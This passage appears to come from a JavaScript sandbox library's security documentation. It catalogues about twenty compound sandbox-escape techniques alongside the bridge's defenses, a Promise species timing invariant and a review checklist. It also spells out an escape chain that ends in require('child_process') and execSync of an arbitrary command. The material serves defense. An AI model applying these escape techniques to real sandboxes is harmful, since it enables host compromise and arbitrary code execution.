- **SharedArrayBuffer / Atomics**: Likely unavailable in default VM contexts due to COOP/COEP requirements. Even if available, SharedArrayBuffer only shares raw bytes -- no object references can cross through it.

- **Error.cause**: Set by user code (not V8 internals), so `ensureThis` handles it through normal property access on proxied errors. Not a V8 internal algorithm bypass.

- **Private fields (#field)**: Use the `[[PrivateName]]` internal slot, which is not accessible through Proxies. Cannot be used to leak host references across the bridge.

- **Iterator helpers** (`.map`, `.filter`, `.take`, etc. on iterators): Operate on sandbox iterators and do not use `ArraySpeciesCreate`. Results are plain iterator objects without species resolution.

- **TypedArray species**: TypedArray values are coerced to numbers during storage. Functions become `NaN`. Species self-return on TypedArrays cannot store object references.

- **Symbol.isConcatSpreadable**: Species is handled by `neutralizeArraySpecies` (which sets `constructor = undefined`), and spreading through the bridge is safe because proxy traps sanitize element access.

- **Proxy.revocable**: Revocation creates errors in the realm where the proxy was created. Since sandbox-created proxies create sandbox-realm errors, this does not introduce cross-realm error leakage.

---

## Future Risks

These are upcoming or proposed features that could introduce new attack surfaces. They should be evaluated as they become available in Node.js.

- **ShadowRealm** (TC39 Stage 3): Creates a new realm from within JavaScript. If available in the sandbox, it could provide a fresh set of intrinsics that bypass bridge protections.

- **Decorators / Symbol.metadata** (TC39 Stage 3): Introduces new cross-realm symbols (`Symbol.metadata`) and decorator evaluation contexts that could provide new prototype chain traversal paths.

- **WASM JSPI** (`WebAssembly.promising` / `WebAssembly.Suspending`): New async boundaries in WebAssembly that could create host promises or bypass async sanitization.

- **Error.isError()** (TC39 Stage 3): Type discrimination that could bypass proxy-based error wrapping. If `Error.isError()` operates on internal slots rather than prototype checks, it could distinguish host errors from sandbox errors.

- **Temporal API**: Introduces new built-in objects with deep prototype chains. Any new global constructor is a potential source of host-realm references.

- **Transformer ecmaVersion upgrades**: Any new JavaScript syntax with implicit catch semantics (like `using` in ES2024) must be evaluated for transformer coverage. The transformer's `ecmaVersion: 2022` limitation means all post-2022 syntax with error-handling behavior is a blind spot.

---

## Summary

### What The Attacker Ultimately Wants

Almost every escape follows this progression:

```
Sandbox Object
  -> Host Constructor (Function)
    -> Code Evaluation ("return process")
      -> process.mainModule.require
        -> require("child_process")
          -> execSync("arbitrary command")
```

Block any step in this chain, and the escape fails. The bridge blocks step 1 (constructor access). The transformer blocks catch-clause access. Promise sanitization blocks async paths to step 2.

### Compound Attack Patterns

The most dangerous attacks combine multiple categories. Each pattern references its constituent categories:

1. **Prototype Pollution + Proxy Trap** [Categories 2, 6]: Pollute `Object.prototype` to inject trap handlers, then trigger the trap via bridge operations.
2. **Symbol.species + Async Error** [Categories 3, 7]: Set `Symbol.species` to custom class, trigger host error in async path, receive unsanitized error in custom class constructor.
3. **Built-in Override + Type Coercion** [Categories 10, 11]: Override `Array` or `Object.create`, then pass object with `valueOf()` to `Buffer.from()` to trigger the override.
4. **Monkey-patch + Promise** [Categories 7, 11]: Override `Function.prototype.call`, then trigger `Promise.then()` to intercept internal callback dispatch.
5. **Object.defineProperty disable + Species Attack** [Categories 3, 11]: Override `Object.defineProperty` to no-op, preventing species reset, then exploit unprotected species.
6. **Symbol Extraction + Array Monkey-patch** [Categories 8, 11]: Override `Array.prototype.splice`/`push` to no-op, then call `Object.getOwnPropertySymbols(hostObj)` hoping the filter uses array methods.
7. **Internal [[OwnPropertyKeys]] + Proxy Trap** [Categories 6, 8]: Call `Object.assign(proxyTarget, hostObj)` where `proxyTarget` is a Proxy with a `set` trap to leak real symbols.
8. **Constructor Accessor TOCTOU + Species Attack** [Categories 3, 7]: Define a getter on `p.constructor` that returns `Promise` on first read (passes check) but returns malicious `Symbol.species` on subsequent reads.
9. **Prototype Mutation + Species TOCTOU** [Categories 2, 7]: Access `globalPromise.prototype` and replace `constructor` data property with accessor. Own-property checks miss inherited accessors.
10. **Symbol.hasInstance + Species Attack** [Categories 3, 7]: Override `Symbol.hasInstance` on `globalPromise` so `instanceof` fails, causing `resetPromiseSpecies` to skip.
11. **Promise Static Method Stealing + Error Trigger** [Categories 4, 7]: Copy Promise static methods to FakePromise, trigger host error during iteration/callback. Unsanitized error goes to FakePromise's reject handler.
12. **Reflect.construct instanceof bypass + Species** [Categories 3, 7]: Use `Reflect.construct(Promise, [...], FakePromise)` to bypass `instanceof` guard, combined with `FakePromise[Symbol.species] = FakePromise`.
13. **Duck-typing + showProxy + Handler Exposure** [Categories 8, 9]: Create Buffer duck-type, invoke inspect with `showProxy: true`, probe exposed handler.
14. **Duck-typing + showProxy + fromOtherWithContext** [Categories 8, 9] (NOW FIXED): Same as 13 but specifically exploits `fromOtherWithContext` method. Variant: `doPreventExtensions` (NOW FIXED).
15. **Host prepareStackTrace + Array.fromAsync + SuppressedError** [Categories 4, 7, 16, 19] (NOW FIXED): Walk prototype chain to get host Array, call `Array.fromAsync` for host promise, use `using` + Error Generation Primitive to create SuppressedError with host TypeError, catch via host promise's unsanitized `.catch()`.
16. **Duck-typing + showProxy + handler.get() with forged target** [Categories 1, 9] (NOW FIXED): Obtain handler via showProxy, use host-side `Array.reduce` to call `handler.get(rawHostFunction, 'constructor')`, leaking raw host `Function` via prototype chain fallback.
17. **Descriptor Extraction + Object.entries + Array Unwrap** [Categories 1, 15]: Get property descriptor for `Function.prototype.constructor`, build nesting via chained `getOwnPropertyDescriptors`, extract with `Object.entries()`. Defense: recursive `containsDangerousConstructor` with cycle detection.
18. **SuppressedError + Symbol Name Trick** [Categories 4, 16]: `DisposableStack.defer()` or `using` with dispose method triggering Error Generation Primitive. `SuppressedError` wraps unsanitized host TypeError. Also works with `AsyncDisposableStack`.
19. **WebAssembly JSTag Exception Catch** [Categories 4, 12, 17]: Wasm module imports JSTag and trigger function. Trigger causes host TypeError via Error Generation Primitive. Wasm `try_table/catch` catches and returns unsanitized externref.
20. **Array Species Self-Return + Object.assign** [Categories 3, 10, 18]: Create host array, set up self-referential species constructor, inject via `Object.assign` (bypasses proxy `set` trap), call `r.map(f)` for raw host values. Chain `cwu` calls to extract host `Function`.

### How The Bridge Defends

| Attack | Defense |
|--------|---------|
| Constructor chain | Returns `{}` for Function constructor access; `isThisDangerousFunctionConstructor` blocks all variants |
| __proto__ access | Intercepts and returns sandbox-side prototype |
| Proxy traps | Wraps Proxy constructor, sanitizes handler objects, null-prototype handlers |
| Symbol.species (Promise) | Unconditionally sets `p.constructor = localPromise` as own data property before every `.then()`/`.catch()` (eliminates TOCTOU) |
| Symbol.species (Array) | Three-layer defense: set/defineProperty traps + neutralizeArraySpecies in apply trap |
| Reflect.construct instanceof bypass | `resetPromiseSpecies` sets constructor on any object, not just `instanceof globalPromise` |
| Species TOCTOU via accessor | Own data property set by `Reflect.defineProperty`; no getter invoked |
| Species TOCTOU via prototype | `globalPromise.prototype` is frozen |
| Symbol.hasInstance bypass | `globalPromise` is frozen |
| Non-extensible promise | `Reflect.defineProperty` fails -> throws `LocalError` |
| Error exploitation | Safe `defaultSandboxPrepareStackTrace`; V8 never falls back to host formatter |
| Promise callbacks | All callbacks wrapped with `ensureThis()` sanitization |
| Promise static methods | All wrapped to use `localPromise` as constructor, ignoring `this` |
| Built-in override | Caches references at init time, uses `Reflect.apply` |
| caller/callee | Throws immediately on access |
| Monkey-patching | Uses cached `Reflect.*` methods, not prototype methods |
| Transformer bypass | Validates against internal variable name patterns |
| Dynamic import | Throws `VMError` unconditionally |
| Prototype trap pollution | Handlers use null-prototype objects |
| Cross-realm symbols | Bridge proxy traps filter dangerous symbols; sandbox overrides reflection APIs |
| Proxy handler exposure | Closure-scoped WeakMap and conversion methods; `isThisDangerousFunctionConstructor` on `get` trap returns |
| Property descriptor extraction | `containsDangerousConstructor` + `preventUnwrap` blocks unwrapping |
| SuppressedError | `handleException` detects and recursively sanitizes `.error`/`.suppressed` |
| WebAssembly JSTag | `WebAssembly.JSTag` deleted from sandbox |
| Array species self-return | set/defineProperty traps + neutralizeArraySpecies + SPECIES_ATTACK_SENTINEL |
| Host prepareStackTrace fallback | Safe default always set; setter resets to safe default instead of `undefined` |

### Key Security Invariant: Promise Species Resolution Timing

The Promise species defense relies on a critical timing invariant:

```
resetPromiseSpecies(p)          <- sets p.constructor = localPromise (own data property)
  | (no user code can run)
apply(globalPromiseThen, p, []) <- V8 internally reads p.constructor for species
  | (synchronous C++ code)
species = p.constructor[Symbol.species]  <- reads localPromise (frozen)
  |
new localPromise(executor)      <- creates safe result promise
```

This invariant holds because:

1. **Data property, not accessor**: `Reflect.defineProperty` sets a plain value -- V8 reads it without invoking any getter.
2. **No interleaving**: Between `defineProperty` and V8's internal read, only callback wrapping occurs. No user code executes.
3. **Cached references**: `apply` = cached `Reflect.apply`, `globalPromiseThen` = closure variable. Neither can be intercepted.
4. **Frozen species chain**: `localPromise[Symbol.species]` returns `localPromise` via a getter on the frozen `globalPromise`. The getter simply returns `this`.
5. **V8 rejects Proxy receivers**: V8's `IsPromise` internal slot check rejects Proxies with "incompatible receiver" TypeError.

Any future changes to species reset must preserve this invariant: **no user-observable operation may occur between setting the constructor and V8's species resolution**.

---

## Security Checklist for Bridge Changes

When modifying `bridge.js`, `setup-sandbox.js`, or `transformer.js`, answer these questions:

1. **Does this change expose any new return path for host objects?** Every return value from proxy traps and bridge functions must be sanitized.
2. **Can sandbox code call this method directly (not through a proxy)?** Methods accessible on handler objects or prototypes can be called with attacker-controlled arguments.
3. **Does this method accept parameters that could be attacker-controlled?** Parameters like `target`, `receiver`, or callback arguments may be forged.
4. **Are all Reflect.* calls using cached references?** Sandbox-side `Reflect` overrides must not affect bridge internals.
5. **Could this path be triggered by V8 internal algorithms (bypassing proxy traps)?** V8 C++ code like ArraySpeciesCreate, FormatStackTrace, and PromiseResolveThenableJob operate on raw objects.
6. **Does this handle all error types that could be thrown (including host-realm errors)?** Any try/catch in bridge code might catch host errors that need sanitization.
7. **Are there any new well-known symbols that need filtering?** New symbols could provide cross-realm communication channels.
